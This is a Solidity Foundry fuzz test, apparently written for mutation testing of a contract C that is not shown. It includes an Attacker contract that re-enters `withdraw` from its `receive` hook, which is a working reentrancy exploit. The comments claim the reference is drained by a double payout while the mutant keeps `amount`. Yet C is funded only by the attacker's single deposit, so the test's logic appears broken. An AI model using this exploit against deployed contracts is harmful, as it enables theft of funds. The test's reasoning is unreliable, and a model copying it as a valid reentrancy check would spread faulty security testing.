pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(); }

    function testFuzz_property(uint256 amount) public {
        amount = bound(amount, 1, 1e18);
        Attacker atk = new Attacker(c, amount);
        vm.deal(address(atk), 2 * amount);
        atk.attack();
        // Reference: the re-entrant withdraw during the first payout still sees the
        // un-decremented balance, so both withdrawals pay out and the contract is drained.
        // Mutant: the balance is decremented before the transfer, so the re-entrant
        // withdraw reverts and the contract keeps `amount`.
        assertTrue(address(c).balance == 0);
    }
}

contract Attacker {
    C c;
    uint256 amt;
    constructor(C _c, uint256 a) { c = _c; amt = a; }
    function attack() external {
        c.deposit{value: amt}();
        c.withdraw(amt);
    }
    receive() external payable {
        try c.withdraw(amt) {} catch {}
    }
}

